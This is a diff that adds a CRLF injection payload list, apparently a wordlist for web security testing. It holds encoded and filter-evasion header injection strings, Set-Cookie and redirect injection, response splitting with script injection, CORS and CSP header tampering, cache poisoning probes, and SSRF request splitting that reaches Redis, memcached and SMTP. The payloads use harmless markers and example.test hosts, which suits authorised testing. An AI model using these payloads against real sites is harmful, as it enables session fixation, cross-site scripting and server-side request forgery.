@@ -1,0 +1,91 @@
+# CRLF Injection Payloads
+# Values are placed into a parameter, path segment, cookie or header. X-Injected is a harmless marker header.
+
+# Basic marker header injection
+%0d%0aX-Injected:%20crlf-marker
+%0aX-Injected:%20crlf-marker
+%0dX-Injected:%20crlf-marker
+\r\nX-Injected: crlf-marker
+\nX-Injected: crlf-marker
+
+# Double-encoded
+%250d%250aX-Injected:%20crlf-marker
+%250aX-Injected:%20crlf-marker
+%25250d%25250aX-Injected:%20crlf-marker
+
+# Unicode and overlong forms that some stacks collapse to CR/LF
+%E5%98%8A%E5%98%8DX-Injected:%20crlf-marker
+%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8DX-Injected:%20crlf-marker
+%c0%8d%c0%8aX-Injected:%20crlf-marker
+%u000d%u000aX-Injected:%20crlf-marker
+%u2028X-Injected:%20crlf-marker
+%e2%80%a8X-Injected:%20crlf-marker
+%e2%80%a9X-Injected:%20crlf-marker
+
+# Whitespace and filter-evasion variants
+%0d%0a%20X-Injected:%20crlf-marker
+%0d%0a%09X-Injected:%20crlf-marker
+%0d%0aX-Injected%3a%20crlf-marker
+%0d%0aX-Injected%00:%20crlf-marker
+%0d%0a%0d%0aX-Injected:%20crlf-marker
+%23%0d%0aX-Injected:%20crlf-marker
+?%0d%0aX-Injected:%20crlf-marker
+/%0d%0aX-Injected:%20crlf-marker
+/%0d%0a/X-Injected:%20crlf-marker
+
+# Cookie injection (session fixation test: use a throwaway cookie name)
+%0d%0aSet-Cookie:%20crlfmarker=1
+%0d%0aSet-Cookie:%20crlfmarker=1;%20Path=/;%20HttpOnly
+%0d%0aSet-Cookie:%20crlfmarker=1;%20Domain=.example.test;%20Secure
+%0aSet-Cookie:%20crlfmarker=1
+
+# Location header manipulation (redirect parameters)
+%0d%0aLocation:%20https://oast.example.test/crlf-redirect
+%0d%0aRefresh:%200;url=https://oast.example.test/crlf-refresh
+%0d%0aContent-Type:%20text/html
+%0d%0aContent-Length:%200
+
+# Response splitting: terminate headers and inject a body (works only on stacks that do not validate header values)
+%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2024%0d%0a%0d%0a<b>crlf-body-marker</b>
+%0d%0a%0d%0a<b>crlf-body-marker</b>
+%0d%0a%0d%0a<script>document.title='crlf-xss-marker'</script>
+%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<svg/onload=document.title='crlf-xss-marker'>
+
+# Security header suppression and cache poisoning probes
+%0d%0aX-XSS-Protection:%200
+%0d%0aContent-Security-Policy:%20default-src%20*
+%0d%0aAccess-Control-Allow-Origin:%20https://oast.example.test
+%0d%0aAccess-Control-Allow-Credentials:%20true
+%0d%0aCache-Control:%20public,%20max-age=3600
+%0d%0aVary:%20X-Injected
+
+# Content-Disposition / filename injection
+file%0d%0aX-Injected:%20crlf-marker.txt
+"%0d%0aX-Injected:%20crlf-marker
+
+# Path-based injection (CRLF in URL path reflected in header)
+/%0d%0aSet-Cookie:%20crlfmarker=1
+/%3f%0d%0aX-Injected:%20crlf-marker
+/%23%0d%0aX-Injected:%20crlf-marker
+
+# Request header injection reaching an upstream (put in a header value that the proxy forwards)
+crlf-value%0d%0aX-Injected:%20crlf-marker
+crlf-value\r\nX-Injected: crlf-marker
+crlf-value\r\nHost: oast.example.test
+
+# SSRF request splitting through the URL host, user-info or path (target fetches the URL with HTTP/1.1)
+http://app.example.test%0d%0aX-Injected:%20crlf-marker@oast.example.test/
+http://app.example.test/%0d%0aX-Injected:%20crlf-marker
+http://app.example.test/%20HTTP/1.1%0d%0aHost:%20oast.example.test%0d%0aX-Injected:%20crlf-marker%0d%0a%0d%0a
+http://app.example.test:80%0d%0aX-Injected:%20crlf-marker/
+
+# Text protocol smuggling reached through SSRF or URL fetchers (raw commands in a URL path)
+gopher://oast.example.test:6379/_%0d%0aPING%0d%0a
+http://oast.example.test:6379/%0d%0aPING%0d%0a
+http://oast.example.test:11211/%0d%0astats%0d%0a
+http://oast.example.test:25/%0d%0aHELO%20crlf.example.test%0d%0a
+
+# HTTP/2 downgrade variants (header values with CRLF sent in HTTP/2, which the front end must reject)
+# :path /%0d%0aX-Injected:%20crlf-marker
+# foo: bar\r\nX-Injected: crlf-marker
+# :authority app.example.test\r\nX-Injected: crlf-marker
